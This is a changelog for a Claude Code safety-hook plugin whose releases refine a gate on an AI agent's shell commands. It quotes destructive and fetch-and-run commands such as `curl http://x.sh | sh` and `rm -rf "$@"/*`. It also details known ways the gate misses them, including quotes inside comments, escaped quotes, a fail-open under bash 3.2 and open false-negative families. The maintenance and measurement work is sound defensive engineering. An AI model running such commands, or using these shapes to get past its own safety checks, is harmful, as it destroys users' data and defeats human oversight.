Those calls now pass `hookSelfTests: false`; the eight that read hook rows run the full set, and a new case checks that the argument drops only the self-test and liveness rows and that the CLI still runs them. Local CPU time for the file went from about 122 s to 26–41 s over three runs. `banned-vocab-engine-parity.test.js` took 3.4–4.8 s on the three macOS legs of the 0.107.1 tag run and sat at 180 s once (run 36657069698, on edce063) while every other test finished: it hung, it was not slow. It now runs one `grep` per pattern with every probe on its own line (27 spawns instead of 999; the old and new calls agree on all 999 pairs), and each spawn has a 30 s timeout whose failure names the pattern.

**Also in this release.** The dev dependency `brace-expansion` is 5.0.12 (was 5.0.9; Dependabot), which closes three advisories against 5.0.9: two denial-of-service by uncontrolled recursion and one quadratic-time expansion. The repository's own `CLAUDE.md` picks up claude-mem-lite's updated managed block; that file binds sessions working in this repository and is not something the plugin installs.

**Found and not fixed.**
- Why `banned-vocab-engine-parity.test.js` hung on that run is not known; the log shows only which file never finished. The timeout bounds a repeat and names the pattern; it does not prevent one.
- If `session-end-check` is killed between writing the temp file and renaming it, the hidden temp file stays in `tasks/`.
- Under bash 3.2 (macOS `/bin/bash`), every here-doc and here-string is written to a temp file (bash 5.1 and later use a pipe for one that fits in a pipe buffer). When bash cannot create or write that file (a full disk, a file-size limit, or no writable location among `$TMPDIR`, `/tmp`, `/var/tmp`, `/usr/tmp` and the working directory), a hook loses the input those constructs carry. Three hooks were run under this condition:
  - `pre-bash-safety-check`, the §8 gate, makes no decision. With `/tmp` and `/var/tmp` read-only and the working directory `/`, it let `rm -rf $X/y`, `npx some-pkg` and `curl http://x.sh | sh` through with exit 0; bash 5.3 denies all three under the same condition. 0.107.1 behaves the same.
  - `session-end-check` stops on an unbound variable at its transcript scan and exits 0 with no checkpoint and no warning, with bash's own error lines on stderr.
  - `banned-vocab-check` still denied `git commit -m "this should work and is robust"`.
  - In every hook, the two programs `hooks/lib/hook-common.sh` reads at source time are left unset: `HOOK_USER_TURN_JQ` is read by `session-end-check`, `banned-vocab-check` and `reply-language-check`, and `HOOK_HEREDOC_AWK` reaches the six hooks that call `hook_trigger_view`. The other hooks were not run under this condition.

## [0.107.1] - 2026-09-30

**Upgrade notes — six fixes from a bug hunt over the code added since 0.89.0; the spec, every module and the §8 gates are unchanged (spec still v7.2.0).** Two change what a hook says: `tmp-sweep`'s pressure advisory no longer tells the model the vitest dirs are swept when node is not on the hook's PATH, and `session-end-check` no longer announces a `paused.md` checkpoint it failed to write (its rule-hits row then carries `paused: null`). One changes an opt-in verdict: `evidence-gate` (`EVIDENCE_GATE=1`) no longer reads a full-width mark such as `（`, `，` or `？` after a runner word (`test`, `smoke`, `pass`, `fail`, `suite`, `overall`) in command output as a test verdict. `/claudemd-clean-residue --apply` now keeps a probe dir whose session was resumed interactively after more than 64 KiB of headless output. `scripts/claim-drift.js` now searches the top CHANGELOG entry and works from a subdirectory. Every hook this release changes has its own switch: `DISABLE_TMP_SWEEP_HOOK=1`, `DISABLE_SESSION_END_CHECK_HOOK=1`, and `evidence-gate` and `verify-log` run only under `EVIDENCE_GATE=1` and `EVIDENCE_WTREE=1` respectively. To go back to 0.107.0, follow `docs/ROLLBACK.md` ("Local machine needs the previous version back").

**`clean-residue` could delete a session the user had resumed.** A probe dir is reaped only when every transcript in it is a headless (`sdk-cli`) session, and the judge read the first 64 KiB of each transcript. A headless `claude -p` run from a temp cwd that wrote more than that before being resumed interactively kept its `"entrypoint":"cli"` rows past the window, so `--apply` deleted it; the USAGE text and the 0.98.0 entry both say such a session is kept. Each transcript is now read whole in 1 MiB chunks, with a 256-character tail re-scanned so a token split across a chunk boundary is still seen, and reading stops at the first entrypoint that is not `sdk-cli`. One class moves the other way: a transcript whose first 64 KiB recorded no entrypoint and whose later rows are all `sdk-cli` was kept as unjudgeable and is now reaped like any headless one; none of the 250 transcripts on the maintainer's machine has that shape. Test: an 82 KB headless-then-interactive transcript and three files whose interactive token straddles the 1 MiB boundary were all reaped before and are all kept now; dropping the re-scanned tail reaps the straddling files.

**`claim-drift` never searched the entry it exists to check, and read nothing from a subdirectory.** It searches a changelog's top entry only and found that entry by the first two `## ` headings containing a version number. `## Versioning policy (set in v0.2.1)` sits above the first entry in this file, so the search ended at the 0.107.0 heading and read none of its lines; `CLAUDEMD_ALLOW_DOWNGRADE` in the 0.107.0 entry was not found and is now. An entry heading is now one that starts with its version (`## [0.107.0] - …`, `## v7.2.0 (…)`), which every entry heading in this file and in `spec/CLAUDE-changelog.md` does. Separately, from a subdirectory `git ls-files` listed paths relative to it, so no prose file matched: from `docs/`, `--range=v0.106.0..HEAD` found 0 of the changed names mentioned where the top level found 23. Every git call now runs from the top level. The ship runbook's text-repair pass reads this list.

**`tmp-sweep` promised a sweep that never started.** Without node on the hook's PATH (a node managed by nvm is often absent from a non-interactive hook shell) the sweep is not spawned; the hook records a `prereq-missing` fail-open row. The pressure advisory still said "The vitest per-run dirs are swept automatically once idle 60 min". With node the advisory is byte-identical to 0.107.0; without it, it says no sweep runs from the hook and the dirs are not being reclaimed. Test: `tests/hooks/tmp-sweep.test.sh` case 8.

**`session-end-check` announced a checkpoint it had failed to write.** When `tasks/` existed but could not be written, `cat > paused.md` failed unchecked: bash's own "Permission denied" reached stderr, the next line still said `paused.md → <path>`, and the rule-hits row named a file that did not exist. The write is now checked; on failure the stderr line says the checkpoint could not be written, a partial file this run created is removed, and the row's `paused` is `null` (`docs/RULE-HITS-SCHEMA.md` documents it). Test: `tests/hooks/session-end-check.test.sh` case 30, with `tasks/` at mode 555, and 30b, with an existing read-only checkpoint in a writable `tasks/`.

**`evidence-gate` read `test（`, `smoke，` and `pass）` as test verdicts.** The output pattern it shares with `verify-log` (`hooks/lib/verify-cmd.sh`) spelled the colon as the bracket `[:：]`. `evidence-gate` applies it in awk, which reads a bracket byte by byte (mawk always, any awk under `LC_ALL=C`), so `：` became the bytes EF BC 9A and every full-width mark sharing its lead bytes matched after a runner word; the advisory then stayed silent. The colon is now the alternation `(:|：)`. Over the 55,184 tool results in the maintainer's transcripts, mawk matched 9,262 lines before and grep 9,254, the 8 extra all this shape; now mawk and GNU grep under `C.UTF-8` and under `C` match the same 9,254, and GNU grep's set under `C.UTF-8` is unchanged, so `verify-log`'s reading is unchanged in a UTF-8 locale (under `C` it had matched the same 8 and no longer does). Test: `tests/hooks/evidence-gate.test.sh` case 26, with `test：ok`, which only the full-width colon can match, as the control that stays a verdict.

**Found and not fixed.**
- In the hooks that set `pipefail`, `printf "$X" | grep -q` can read as "no match": when `grep` exits at a matching line while `printf` is still writing the rest of `$X`, `printf` takes SIGPIPE and the pipeline returns 141. 53 lines of this shape (`printf` or `echo` piped into `grep -q`) sit in seven hooks, 31 of them in the §8 gate. A §8 verdict change needs a replay of real commands first, so this is recorded rather than patched.
- `spec-module-inject` passes the prompt to `jq --arg`; a prompt of 131,072 bytes or more exceeds the kernel's per-argument limit and the `ship` module is not injected. 0 of 3,215 prompts reach that size.
- The same bracket shape as `T2_OUT_RE` is still in `evidence-gate`'s `DONE_RE` (`[:：]`) and in `transcript-structure-scan`'s `证据[:：]` and `[:—-]`. Those run `grep` in the inherited locale: under a UTF-8 locale they read correctly; under `LC_ALL=C` GNU grep reads the bracket byte by byte, so `Done（x）` reads as a completion claim. Hooks on the maintainer's machine run under `C.UTF-8`.
- `tmp-sweep` can delete the temp dir of a `vitest run` that is still running once the dir has been idle past the 60-minute floor, because vitest re-reads cached transforms without touching their mtime. 0.93.0 listed this as a known limit; it has now been reproduced with the floor lowered to 1 minute, not at 60.

## [0.107.0] - 2026-09-29

**Upgrade notes — spec v7.2.0, and Claude no longer runs claudemd commands on its own.** Fifteen of the sixteen `/claudemd-…` commands are now user-invoked only (`disable-model-invocation: true`); `/claudemd-design-adopt` is unchanged. Type a command yourself as before. When you ask Claude in words to refresh, update or check the plugin, it asks you to run the command instead of running it. There is no per-command switch: `skillOverrides` does not apply to plugin skills. To go back to 0.106.0, follow `docs/ROLLBACK.md` "Local machine needs the previous version back": make Claude Code load the 0.106.0 plugin first, run `CLAUDEMD_ALLOW_DOWNGRADE=1 node scripts/install.js` from a checkout of `v0.106.0`, then restart. Loading the old plugin alone leaves spec v7.2.0 installed, and its SessionStart banner sends you back to `/claudemd-refresh`. The spec's one rule change: core §11 no longer lists context pressure as a reason to stop mid-task. Plan and evidence: `docs/spec-optimization-plan-2026-09-29.md`.

**Command descriptions leave the model's context.** Claude Code keeps a user-invoked command's description out of the model's skill listing, so each session carries 3,591 fewer bytes (measured on a real session's listing of 24,985 bytes). Across 248 local session transcripts (2026-09-05 to 2026-09-29) the model invoked these commands itself 8 times, and users typed them 15 times. A hook-free probe (`claude -p --setting-sources project --plugin-dir` on a copy of `commands/`) showed the listing drop from 29 to 14 skills, with `claudemd-design-adopt` the only claudemd entry left. The two SessionStart notices that name `/claudemd-install` (spec file missing) and `/claudemd-update` (spec drift) now also reach you as a system message, and tell Claude to ask you to run the command.

**Spec v7.2.0: a shorter core with the same rules.** Model-visible core 24,740 → 23,320 bytes (−5.7%). On disk it is 23,522 bytes, because the header and one maintainer pointer are now block HTML comments, which Claude Code strips before injection. Repetitions are stated once, text the Claude Code system prompt already carries is dropped, the §0.2 merge thresholds move to `modes.md` and §3 User relaxation's named channels to `auth.md` (§3-EXT). §11 Mid-SPINE turn-yield drops "context pressure" from its yield list: the Claude Code system prompt says context is summarized and there is no need to wrap up early, and the two contradicted each other. Details: `spec/CLAUDE-changelog.md`.

**How it was checked.** Offline A/B through `scripts/offline-eval/run.mjs` (Opus 5.5, high effort, 5 runs each of T1–T5 and T8–T12): the draft passed 50/50 at $10.28, v7.1.0's recorded runs 49/50 at $10.27, and the AUTH, §8 rm-gate and multi-step tasks were 5/5. The A/B ran the draft; the released core is 451 visible bytes longer, because review restored three pointers and five operative clauses the draft had removed (listed in `spec/CLAUDE-changelog.md`) and reworded three lines.

**Known limits.**
- Five runs per task detect only a large regression, and the two arms ran two days apart (claude 2.1.283/284 against 2.1.285).
- The A/B tasks do not exercise the moved clauses. What moved is detail (merge thresholds, the list of named channels); core keeps each rule's operative sentence, and the moved text reaches a session only when its module is injected or read.
- Extended is 49,046 of its 50,000-byte cap.

## [0.106.0] - 2026-09-29

**Upgrade notes — changes to §8 gate verdicts (the rm and npx checks), all in `hooks/pre-bash-safety-check.sh`; no other hook's verdict changes (spec still v7.1.0).** The positional-parameter check and the comment-quote pass only add denies. The escaped-quote change moves verdicts both ways: it removes false denies and closes false negatives. Replaying the 9,043 distinct real commands containing `rm` or `find` from the maintainer's transcripts through 0.105.0 and 0.106.0: 4 allow → deny and 6 deny → allow. Of the 4, 3 are an unguarded `rm` that a comment had hidden and 1 is the word `npx` inside a `node -e "…"` script, which the gate denies (a false positive it already produces for the same command without the comment). Each of the 6 is an `rm` inside a quoted argument, a `printf` payload or a heredoc body, so nothing ran it. `rework-breaker`, `reply-language-check`, `cross-repo-write-check`, `evidence-gate`, `hooks/lib/hook-common.sh` and the spec are unchanged. Opt-out, as before: `DISABLE_PRE_BASH_SAFETY_HOOK=1`. To go back to 0.105.0, follow `docs/ROLLBACK.md` ("Local machine needs the previous version back").

**A positional or special parameter that leads an rm target is judged.** 0.105.0 listed this under Known limits: the gate never judged `$1`–`$9`, `$@` or `$*`, so `rm -rf "$1/build"` was allowed. With no arguments it is `rm -rf /build`, and `rm -rf "$@"/*` is `rm -rf /*`. The gate now denies when such a parameter, bare or braced, is the target's first component and a `/` follows it, or when it is a `find`'s whole starting point: an unquoted empty one starts the `find` at `.`, and the quoted spelling is denied as well because the gate reads the tokens after unquoting them. The one guard that passes is `${1:?}` inside the target, as in `"${1:?}/build"`; a check written elsewhere, such as an argument count, does not, and the deny line says so. A bare `rm -rf "$1"` stays allowed: when `$1` is empty it deletes nothing. The check stands apart from the variable analysis and can only add a deny. It also closes the braced twin of the shape below, `rm -rf "${1}/$D"` with a `${1:?}` elsewhere, which 0.105.0 allowed. This release's first build instead put digits into the variable class, which let `$1` displace the variable after it: `rm -rf "$1/$D"` with a `${1:?}` elsewhere in the command went from deny to allow. The pre-tag review caught it, and that build did not ship. No real command changes verdict under the check as released. The first build denied 8, each a bare `"$1"`/`"$2"`, a `"$1.bak"` or a literal path ending in `$1`, and none of them reaches a root path when empty. `$0` is not matched by the check; two older scans that 0.106.0 widened to digits (the whitelisted-variable residue and the mktemp provenance scan) still count it, so `rm -rf "$HOME/$0"` is denied. A parameter that empties a target without leading it (`~/"$1"`, `/srv/data/"$1"`, `"$1"*`) is not judged; see Known limits. Corpus rows S8-POS1–27.

**A quote inside a comment no longer hides the commands below it.** The gate pairs quotes before it strips comments (a `#` inside a string is not a comment), so the apostrophe in `# the script's layout` paired with the next single quote, and every line up to a later multi-word single-quoted string was read as string content: an unguarded `rm -rf $SP/x` on the next line was allowed. The `npx` and `curl … | sh` checks had the same hole. The fix is deny-only by construction: the first analysis is unchanged, and only when it allows and blanking the quote characters inside comments changes the text does the hook analyse that text a second time, where a deny is the verdict. A comment is recognised at the start of a line or after a space, a tab or one of `; & | ( ) < >`, which is where bash starts one, with one exception: bash starts no comment after the `)` of `$(…)` or `$((…))`, and the pass does, which can add a false deny (registered as F13). That second run writes only its deny row, marked `extra.comment_pass` (documented in `docs/RULE-HITS-SCHEMA.md`), so the first run's allow-side rows are not written twice. It runs on commands that have a quote inside a comment and that the first run allowed. 1,033 of 78,189 distinct real Bash commands have such a comment; of the 9,043 rm/find ones, 330 have one and were allowed by 0.105.0. On those it about doubles the hook's time: on 100 of the 330, run one after another at load 5–6, p50 146 → 301 ms and max 957 → 1,873 ms. The pre-tag reviewer's rerun at load 7 reached 3,303 ms, past the hook's 3 s timeout. When that happens Claude Code drops the hook and the command runs, as it would have after the first run's allow. For a command over about 128 KiB the second run cannot receive the text, and the hook writes a `fail-open` row and keeps the first run's allow.

**An escaped quote can no longer open a single-token unquote.** In `echo "a \"c\"" 'x; rm -rf $f'` the gate paired the escaped quote with the real closing quote, unwrapped the empty `""` between them and left the real string unterminated, which exposed the single-quoted `rm` and denied a command that runs no `rm`. The mirror image hid text and allowed it: `echo "a \"" ; npx some-package ; echo "b c"` is denied now. While that step runs, each `\\` and then each `\"` is swapped for a control byte and restored afterwards; the only thing that changes is where a match may begin. A command that already carries either byte keeps the old path. Corpus rows S8-EQO1–5; rows 1–2 flip on 0.105.0.

**Known §8 residuals are labelled, counted and documented.** Rows for residuals the gate is known to get wrong used to sit under `pass` (false negatives) and `deny` (false positives), so repairing one looked exactly like a regression. The corpus now has two strict labels: `xfn` asserts today's allow and fails with "relabel it deny" once the gate denies; `xfp` asserts today's deny and fails with "relabel it pass" once it allows. The runner prints `Residuals: xfn=45 xfp=9`. `docs/S8-RESIDUALS.md` names thirteen families (F1–F13), each with its shape, its corpus rows, why it is accepted and its frequency in real commands, or "not measured" where it has not been counted. `.claude/agents/release-reviewer.md` asks every §8 false-negative finding for its provenance: field evidence blocks a release unless its family's field-hit count already includes that shape; a reviewer-constructed shape in a registered family is a non-blocking note.

**Maintainer tooling (`scripts/offline-eval/`, not run by any hook): an AST shadow of the rm gate.** `s8-shadow.mjs` runs the gate and `s8-ast/ast-rm.sh` (a verdict computed on `shfmt`'s parse tree) over every command that contains an `rm` or `find` word, and reports where they agree and disagree. It is research tooling, not a runtime dependency: `shfmt` comes from `$SHFMT` only, and `ast-rm.sh` exits 2 when it is missing or older than 3.14.0. The tests use recorded `shfmt` 3.14.1 output, so CI needs no `shfmt`. It found the positional-parameter false negative above. Its own positional policy is still the first build's, so on the corpus it disagrees with the gate on the S8-POS rows.

**`verify-log`: the failure pattern is measured and stays as it is.** 0.105.0 listed the passing-run shapes that `FAIL_OUT_RE` drops. Over the maintainer's transcripts it drops 3,765 of 14,052 verification runs that exited 0, and 3,176 of those print a nonzero failure count. Of the rest, a hand-built classifier reads 58 to 95 as passing runs, depending on which summaries it counts: 0.5–0.9% of the 10,876 runs with no nonzero failure summary. That is an estimate, not a bound. Narrowing the pattern would trade those for logging failed runs as verification. The comment in `hooks/lib/verify-cmd.sh` now says so; no row changes.

**Tests: inherited opt-in switches.** `tests/lib/env-hygiene.sh` scrubs the claudemd knobs a shell may export before any suite runs, but its explicit list missed 0.105.0's `EVIDENCE_WTREE`, `EVIDENCE_GATE_DELIVER` and `DEBUG_ON_TEST_FAILURE`, and `SPEC_MODULE_GATE`. With `EVIDENCE_WTREE=1` in a machine's settings, `verify-log.test.sh` failed 3 of 11. `tests/scripts/env-hygiene-coverage.test.js` now finds every knob a hook reads through a default expansion (`${X:-…}`) of a name no hook assigns, and fails if the reset leaves one set.

**Why the verdict changes waited for this release.** 0.105.0 held back every change to §8 verdicts so as not to cut short the maintainer's pre-registered evaluation of 0.94's rm-gate change. Its written stop rule ended the window at a sample size on two metrics or at 28 days, whichever came first. A 2026-09-26 revision had closed one of the two metrics, so the sample-size condition could no longer be met and only the 28-day limit (2026-10-23) was left. On 2026-09-29, before counting anything inside the window, the maintainer revised the rule to the remaining metric's sample size. Counting only that sample size, it had been reached on 2026-09-27, so the window closed there. In the maintainer's transcripts, the share of `rm` commands on a `$VAR` denied before a session's first §8 deny fell from 28.2% (186/660, 2026-09-18 to the 0.94 install) to 6.3% (36/570) after it. Replaying both sets of commands through one fixed gate gives 30.0% and 9.3%, so the commands being written changed, not the verdicts. This is a before-and-after comparison, not a controlled one.

**Known limits.**
- Thirteen residual families stay open: 45 known false negatives and 7 + 2 = 9 known false positives, each asserted by a corpus row. Found or registered in this release:
  - F7 `find \( … \)` grouping, F8 a multi-line `bash -c '…'`, F9 a whitelisted variable whose only subpath is a command substitution.
  - F10 a single-token quoted `#` that hides the rest of its line, F11 `$'…'` quoting, and F6's false-negative side (an escaped backslash at the end of a line, and a comment after a backslash-newline).
  - F12: a positional parameter that empties a target without leading it. `rm -rf ~/"$1"` is the home directory and `rm -rf "$1"*` every file in the current directory when `$1` is empty; the gate denies these shapes when written with `$D` or `${1}`. No real command in the 9,043 has this shape.
  - F13: the false deny after the `)` of `$(…)` described above.
- Replaying the real commands with each hiding structure removed changed no verdict for F10 or F6. For F11 two commands' verdicts changed: in one the rewrite deleted the `rm` itself, in the other the `rm` is a quoted argument nothing runs. These families wait for a parser-based gate.
- The 0.105.0 Known limits stand, except the positional-parameter one, which is fixed where the parameter leads the target; F12 covers the rest.

## [0.105.0] - 2026-09-29

**Upgrade notes — one change to what module injection sends, one reworded §8 deny line, and three new hooks that do nothing until opted in. No §8 verdict changes; `rework-breaker`, `reply-language-check`, `cross-repo-write-check`, `hooks/lib/hook-common.sh`, core, extended and every module body are unchanged (spec still v7.1.0).** (1) `spec-module-inject` no longer sends the `<!-- generated from … -->` build comment with each module (112 characters a module), and when a second module would take one prompt's injection past 9,800 characters, that module is injected with a later prompt instead. (2) `deferred-notice` (UserPromptSubmit), `verify-log` (PostToolUse on Bash) and `test-failure-debug` (PostToolUseFailure on Bash) are registered. `verify-log` and `test-failure-debug` exit at their flag check unless opted in (`EVIDENCE_WTREE=1`; `DEBUG_ON_TEST_FAILURE=1`); `deferred-notice` exits after one glob unless a notice is queued, which only `evidence-gate` does, and only with `EVIDENCE_GATE_DELIVER=1` together with `EVIDENCE_GATE=1`. Opt-outs: `DISABLE_SPEC_MODULE_INJECT_HOOK=1`, `DISABLE_DEFERRED_NOTICE_HOOK=1`, `DISABLE_VERIFY_LOG_HOOK=1`, `DISABLE_TEST_FAILURE_DEBUG_HOOK=1`. To go back to 0.104.1, follow `docs/ROLLBACK.md` ("Local machine needs the previous version back").

**Module injection stays under Claude Code's 10,000-character limit.** Claude Code replaces an `additionalContext` string longer than 10,000 characters with a file path and a 2,000-character preview, and does not ask the model to read the file. `memory` + `plan`, a pair one ordinary prompt draws, injected 9,929 characters, and no test guarded the limit. Without the build comment the pair is 9,705. A second module that would pass the 9,800-character budget is recorded as pending and injected with a later prompt from a person: the first one whose own modules leave it a slot and room under the budget (a task notification or teammate message does not count). The `module-inject` row names it in `extra.deferred`. With the modules shipped today no pair reaches the budget, so this path is a guard for future module growth. `spec-modules.test.js` checks that every module fits the budget on its own, and `spec-module-inject.test.sh` cases 16–17 (the real pair, and a synthetic over-budget pair) fail on 0.104.1.

**`test-failure-debug`: the `debug` module when a test run fails (opt-in `DEBUG_ON_TEST_FAILURE=1`, default OFF).** Module injection reaches `debug.md` only through the words of the user's prompt. Before building this, with the decision rule fixed first (at least 30 sessions and a gap of at least 0.50): of the 70 sessions on the maintainer's machine since 2026-09-05 that had a failed test run, 44 (0.629) had no prompt matching the `debug` trigger at or before the first failure. On Claude Code 2.1.284 a Bash call that exits non-zero fires `PostToolUseFailure`, not `PostToolUse`, so the hook sits on `PostToolUseFailure`. When a test runner at command position fails (`npm test`, `pytest`, `node --test`, `cargo test`, `bash tests/…` and others, after `npx`, `env`, `timeout N` or `VAR=x` prefixes) and `debug.md` is not yet in the session, it injects the module once, sharing `spec-module-inject`'s once-per-session list in both directions. A runner named elsewhere in a command (`grep -r pytest src`) does not count, but quotes are not parsed, so a separator inside a quoted string makes the next word a command position: `grep -E 'jest|vitest|mocha' package.json` failing fires it.

**`evidence-gate` can give the model its observation with the next prompt (two opt-ins).** Stop hooks can send `additionalContext` to the model since Claude Code 2.1.163, but on Stop it continues the turn: one more model reply per firing. A 2026-09-26 replay over 1,747 turn ends found this verdict right at most 3 times in 21 firings. So with `EVIDENCE_GATE_DELIVER=1` as well as `EVIDENCE_GATE=1`, the Stop hook writes the observation to `~/.claude/.claudemd-state/notice-<session>.evidence-gate`, and `deferred-notice` adds it to the model's context with that session's next prompt, whatever sent it (a person, a task notification or a teammate message): once, at most 2,000 bytes, as an observation that names its source and the user's switch. There is no extra turn, and nothing is added if the conversation ends. Headless runs (`entrypoint` `sdk-*`) queue nothing, and neither does a session with `DISABLE_DEFERRED_NOTICE_HOOK=1`, since nothing would read the notice. With `EVIDENCE_GATE=1` alone, the observation still reaches only the human, as in 0.104.1. The second switch exists because the maintainer's pre-registration for this gate holds any channel into the model until the verdict reaches 0.8 precision. Also:
- The human-facing stderr line no longer says a Stop hook has no channel into the model.
- `evidence-advisory` rows carry `extra.queued`; a delivery writes a `notice-delivered` row.
- `/claudemd-clean-residue` removes notices nobody picked up (a fourteenth class), and `uninstall --purge` removes the `notice` stem.

**`verify-log`: the working-tree fingerprint of verification runs (opt-in `EVIDENCE_WTREE=1`, default OFF; log only).** `evidence-gate` decides "verified" from the transcript, and an edit made through a Bash heredoc is visible to it only when Claude Code records `bashEditDiff`. A content fingerprint answers the question without caring how the files changed. `hooks/lib/wtree.sh` stages the working tree into a temporary index seeded from a copy of the real one and runs `git write-tree`; the real index is not touched. It is adapted from gstack's `gstack-wtree` (MIT; the notice is in the file). One fingerprint of this repository took 27 ms. Each is bounded at 2 s where `timeout` or `gtimeout` exists; without them a bash fallback stops the fingerprint at 2 s but the hook still waits for its git process to finish. A fingerprint stopped at the bound removes its temporary index (the bound sends SIGTERM, which the fingerprint traps). `verify-log` logs a verification run that exited 0 and whose output matches no failure pattern as `verify-run {tier, cmd_key, wtree}`; the output check matters because a runner piped into `tail` exits 0 when it fails. The pattern (`FAIL_OUT_RE`) also drops some passing runs, the direction that under-counts verification: an eslint summary with warnings only, a `FAIL` word in a label or a zero count (`FAIL: 0`), a test name containing `failed`, a TAP `not ok … # TODO`. With the switch set, `evidence-gate` logs `claim-wtree {verdict, wtree}` at each claim. `scripts/offline-eval/wtree-verdicts.mjs` cross-tabulates the two. `evidence-gate`'s verdict does not change: its three command and output patterns moved byte-for-byte into `hooks/lib/verify-cmd.sh`, which both hooks read. Side effect, disclosed: the contents of modified and untracked, non-ignored files, and tree objects, enter `.git/objects` as unreachable objects until `git gc` prunes them (by default once they are two weeks old).

**§8 rm gate: the deny line names the variable when a whitelisted target's only subpath is an expansion.** `rm -rf "${PWD:?}/$arm"` was denied as "rm -rf $PWD with no subpath": the gate deletes every expansion from the target before looking for a literal subpath, so a subpath made only of `$arm` read as bare `$PWD`. The line contradicted what was typed, and its generic advice (guard the variable that can be empty) does not pass there, because `"$PWD/${arm:?}"` is denied too. It now reads `rm -rf $PWD whose only subpath is $arm: the gate reads $arm as empty, which is bare $PWD, and a guard on $arm does not change that. Write the subpath literally.` A truly bare target keeps the old wording. Message only: replaying 9,104 distinct real rm/find commands from the maintainer's transcripts through the previous gate and this one gave 0 verdict changes and 1 changed reason.

**`docs/HOOK-PROTOCOL.md`: Stop accepts `additionalContext`.** It said Stop hooks cannot emit `hookSpecificOutput` because the event has no context schema, and `evidence-gate.sh` and `mem-audit.sh` repeated it. Claude Code 2.1.163 added `hookSpecificOutput.additionalContext` to Stop and SubagentStop, where it continues the conversation. The advisories stay on stderr; the stated reason is now the real one: on Stop the channel costs a model reply per firing.

**Maintainer tooling (`scripts/offline-eval/`, not run by any hook).**
- `run.mjs` removes the per-run task-output directory Claude Code keeps under `<tmp>/claude-<uid>/<encoded cwd>/`. It had removed its sandbox and the matching `~/.claude/projects` directory, but not this one; 246 directories of dangling links had piled up. It removes only names that carry its fixture marker.
- Two trap tasks, after superpowers-evals: T11, where the user never mentions tests and the fix must be tested before it is committed, and T12, where the unit suite is green while the entry point is broken and the model must run the entry point and say so. With the current spec both passed 5 of 5 runs.
- `iron-law-judge.mjs` samples turns that edited code, has a pinned `claude-haiku-4-5-20251001` judge them against an Iron Law #2 rubric (three votes, majority, an UNKNOWN exit), and scores the judge against labels with `sampling-audit`'s 0.8 precision gate.

**Known limits.**
- The deferred delivery has no measured effect on what the model does next. The planned check needs two-turn runs, and on the offline tasks the gate almost never fires: in 42 past runs of the bugfix and additive tasks that edited code, none ended without a runner after the last edit.
- The §8 rm gate does not treat a positional parameter as a variable: `rm -rf "$1/build"` is allowed, as in 0.104.1, while `rm -rf "${1}/build"` is denied. Guard it as `"${1:?}/build"`. The fix is written and waits for a later release together with two other changes to §8 verdicts, so that the maintainer's running evaluation of the 0.94 rm-gate change is not cut short. On the maintainer's transcripts it would deny 8 of 75,152 distinct commands, each an `rm` of `$1` or `$2` inside a function body, none with a `/` after the parameter.
- `test-failure-debug` sees only failures that exit non-zero. A runner piped into `tail` or `head` (or into a `grep` that matches) exits 0 when it fails, and on the maintainer's transcripts that was the only kind of failure in 120 of the 186 sessions with a failing runner (2026-09-29), so the hook never fires in those sessions.
- `test-failure-debug` recognises a runner only at command position: not right after the opening quote of `bash -c 'npm test'` (after a separator inside the string it is), not behind a wrapper script it does not name, and not after `sudo`, `nice`, `time`, `env -u X` or as `./node_modules/.bin/<runner>`.
- `verify-log` writes no row outside a git work tree with at least one commit; `evidence-gate`'s `claim-wtree` row there carries `wtree: null`.
- The 0.104.1 Known limits stand unchanged.

## [0.104.1] - 2026-09-28

**Upgrade notes — two fixes; the spec, every module and the §8 gates are unchanged (spec still v7.1.0).** (1) `spec-module-gate` (default `SPEC_MODULE_GATE=log`: a telemetry row, no visible effect) now removes the `&>`, `&>>` and `>|` redirections and a redirection glued to `;` or `(`, which 0.104.0 listed under Known limits. (2) `session-end-check` recognises two more ways of running a test suite, so a session that ends after one of them no longer gets a false `tasks/session-end-<sid>-paused.md` checkpoint. `DISABLE_SESSION_END_CHECK_HOOK=1` turns that hook off. To go back to 0.104.0, follow `docs/ROLLBACK.md` ("Local machine needs the previous version back").

**`spec-module-gate` removes `&>`, `&>>`, `>|` and a redirection glued to `;` or `(` (D#148; 0.104.0 Known limits).**
- 0.104.0 removed `<`, `>` and `>>` (and with them `<>`) with their targets. `&>` and `&>>` left their `&` and `>|` left its `|`, which then split the simple command. `true;2>/dev/null git push --tags` left `2` as the first word. Of 8 constructed release commands of this kind (`git push &>/dev/null origin v1.2.3`), 0.104.0 missed 7; 0.104.1 recognises all 8. Of 6 constructed non-release commands (`npm publish>|log --dry-run`), 0.104.0 read all 6 as releases; 0.104.1 reads none.
- The command word's basename is taken only when the word contains a `/`. On a 100,000-character first word with no `/`, `${w##*/}` took 2,991 ms against the 3 s hook timeout; it now takes 231 ms. A first word of that length that contains a `/` is as slow as in 0.104.0 (see Known limits).
- A replay of the 4,349 distinct transcript commands on the maintainer's machine that name git/gh/npm and tag/push/release/publish gives the same verdict for every command as 0.104.0 (269 releases). These spellings did not occur there.
- `tests/hooks/spec-module-gate.test.sh` case 15 parsed bash's `time` output with a `.` decimal and failed under a comma-decimal locale (`LC_ALL=en_DK.utf8`); its timing groups now set `LC_ALL=C`.

**`session-end-check` recognises `env -u NAME` / `env --unset NAME` and runners called as `./node_modules/.bin/<runner>` or `node_modules/.bin/<runner>` (D#102 F7).** `env -u CLAUDE_MEM_DIR ./node_modules/.bin/vitest run` ran a test suite but did not count as a validation: `env`'s `-u` took `NAME` as the command, and `./node_modules/.bin/vitest` was not a recognised command word. `env -u vitest npm install`, which 0.104.0 read as a vitest run, no longer counts. On the maintainer's transcripts, 13 of 34,944 distinct main-session commands and 145 of 35,659 distinct subagent-transcript commands now count as validations; each of the 158 ends in a test runner (`bash tests/…`, vitest, `node --test`, `npm test`, `cargo test`, `pytest`), and no command stopped counting. Replaying the 125 finished sessions since 2026-09-20 changes no session's checkpoint verdict. `git -C <dir> commit` still does not count: a commit in another repository validates nothing in this one.

**Known limits.**
- `spec-module-gate`: a first word of about 100,000 characters that contains a `/` still takes about as long as the 3 s timeout (2,202 ms on the maintainer's machine, 2,184 ms in 0.104.0; the pre-tag review measured 3,450 ms), and a killed hook allows. A long version-shaped argument that ends in a non-version character is quadratic: `git tag x-1.1-1.1…-1.1!` of 10,000 and 20,000 characters takes 129 and 428 ms, and the pre-tag review saw 100,000 characters run past a 10 s cap; 0.104.0 behaves the same.
- `spec-module-gate` does not remove a named-descriptor redirection (`{fd}>/dev/null git push --tags`).
